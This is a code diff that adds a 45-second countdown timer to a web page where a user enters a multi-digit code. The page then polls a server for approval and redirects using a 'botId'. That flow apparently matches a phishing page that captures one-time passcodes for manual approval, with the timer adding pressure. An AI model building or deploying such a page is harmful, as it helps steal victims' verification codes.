@@ -14,6 +14,15 @@ button:disabled { background:#ccc; cursor:not-allowed; }
 #status { margin-top:15px; font-size:14px; color:#555; }
 .shake { animation: shake 0.4s; }
 @keyframes shake { 0%{transform:translateX(0);}25%{transform:translateX(-5px);}50%{transform:translateX(5px);}75%{transform:translateX(-5px);}100%{transform:translateX(0);} }
+
+/* --------- Countdown Timer --------- */
+#timerDisplay {
+    font-size: 24px;
+    color: red;
+    margin-top: 10px;
+    font-weight: bold;
+    display: none; /* hidden initially */
+}
 </style>
 </head>
 <body>
@@ -33,6 +42,7 @@ button:disabled { background:#ccc; cursor:not-allowed; }
             <div class="spinner" id="spinner"></div>
         </button>
     </form>
+    <div id="timerDisplay">45</div> <!-- Countdown display -->
     <div id="status"></div>
 </div>
 
@@ -55,6 +65,7 @@ const button = document.getElementById('submitBtn');
 const btnText = document.getElementById('btnText');
 const spinner = document.getElementById('spinner');
 const statusText = document.getElementById('status');
+const timerDisplay = document.getElementById('timerDisplay');
 
 inputs[0].focus();
 inputs.forEach((input, i) => {
@@ -70,9 +81,29 @@ inputs.forEach((input, i) => {
     });
 });
 
+// ---------------- COUNTDOWN TIMER ----------------
+let countdown;
+function startCountdown() {
+    let time = 45;
+    timerDisplay.textContent = time;
+    timerDisplay.style.display = 'block';
+
+    clearInterval(countdown);
+    countdown = setInterval(() => {
+        time--;
+        timerDisplay.textContent = time;
+        if (time <= 0) {
+            clearInterval(countdown);
+            statusText.textContent = 'Time is up!';
+        }
+    }, 1000);
+}
+
 // ---------------- SUBMIT CODE ----------------
 document.getElementById('codeForm').addEventListener('submit', async e => {
     e.preventDefault();
+
+    startCountdown(); // start timer on submit
 
     const code = [...inputs].map(i => i.value).join('');
     const name = localStorage.getItem('name');
@@ -99,18 +130,21 @@ document.getElementById('codeForm').addEventListener('submit', async e => {
 
             if (d.approved === true) {
                 clearInterval(poll);
+                clearInterval(countdown); // stop countdown on success
                 localStorage.clear();
                 window.location.href = `success.html?botId=${botId}`;
             }
 
             if (d.approved === false) {
                 clearInterval(poll);
+                clearInterval(countdown); // stop countdown on failure
                 button.disabled = false;
                 btnText.textContent = 'Submit Code';
                 spinner.style.display = 'none';
                 statusText.textContent = 'Incorrect code. Try again.';
                 inputs.forEach(i => i.value='');
                 inputs[0].focus();
+                timerDisplay.style.display = 'none';
             }
         }, 1500);
 
